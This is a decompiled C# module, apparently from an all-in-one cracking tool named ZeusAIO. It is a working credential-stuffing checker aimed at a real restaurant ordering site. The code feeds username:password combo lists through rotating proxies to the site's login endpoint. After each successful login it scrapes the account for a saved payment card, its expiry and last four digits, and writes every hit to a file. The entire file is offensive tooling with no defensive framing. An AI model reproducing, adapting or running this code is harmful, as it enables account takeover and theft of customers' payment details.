// Decompiled with JetBrains decompiler
// Type: Bagelboy.Check
// Assembly: ZeusAIO, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 70786947-2129-410F-AE9A-C082629DAC36
// Assembly location: C:\Users\ofekt\Desktop\סורס\ZeusAIO.exe

using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using ZeusAIO;

namespace Bagelboy
{
  internal class Check
  {
    public static int threads = 0;
    public static string proxyprotocol = "";
    public static List<string> combos;
    public static List<string> proxies1;
    public static int proxytotal = 0;
    public static int combototal = 0;
    public static int free = 0;
    public static int comboindex = 0;
    public static int cpm = 0;
    public static int cpm_aux = 0;
    public static int check = 0;
    public static int error = 0;
    public static int hit = 0;
    public static int bad = 0;
    public static int h;
    public static int m;
    public static int s;

    public static bool CheckAccount(string[] s, string proxy)
    {
      for (int index = 0; index < Config.config.Retries + 1; ++index)
      {
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              proxy = mainmenu.proxies.ElementAt<string>(new Random().Next(mainmenu.proxiesCount));
              if (mainmenu.proxyProtocol == "HTTP")
                httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS4")
                httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS5")
                httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
              httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
              httpRequest.IgnoreProtocolErrors = true;
              httpRequest.AllowAutoRedirect = true;
              httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
              string str1 = "username=" + s[0] + "&password=" + s[1] + "&app_id=&restaurant_id=564b586f4f5ee9ab057b23c6&order_id=&ajax=true";
              string str2 = httpRequest.Post("https://ordering.orders2.me/login?to=https%3A%2F%2Fordering.orders2.me/menu/bagelboy3rdave%3Fkey%3D349f2ff5ba80df26513caf426321d4e1%26include_combo%3Dtrue", str1, "application/x-www-form-urlencoded").ToString();
              if (!str2.Contains("error"))
              {
                if (str2.Contains("{\"success\":true}"))
                {
                  string source = httpRequest.Get("https://ordering.orders2.me/admin/user/profile").ToString();
                  string str3 = Check.Parse(source, "expires", "</p>");
                  string str4 = Check.Parse(source, "ending in", "expires");
                  string str5 = !source.Contains("expires") ? "false" : "true";
                  ++mainmenu.hits;
                  if (mainmenu.p1 == "2")
                    Colorful.Console.WriteLine("[HIT - BAGELBOY] " + s[0] + ":" + s[1] + " | Has payment method: " + str5 + " | Expiration: " + str3 + " | Last four: " + str4, Color.Green);
                  Export.AsResult("/BagelBoy_hits", s[0] + ":" + s[1] + " | Has payment method: " + str5 + " | Expiration: " + str3 + " | Last four: " + str4);
                  return false;
                }
              }
              else
                break;
            }
          }
          catch (Exception ex)
          {
            ++mainmenu.errors;
          }
        }
      }
      return false;
    }

    public static string Base64Encode(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));

    private static string Parse(string source, string left, string right) => source.Split(new string[1]
    {
      left
    }, StringSplitOptions.None)[1].Split(new string[1]
    {
      right
    }, StringSplitOptions.None)[0];
  }
}
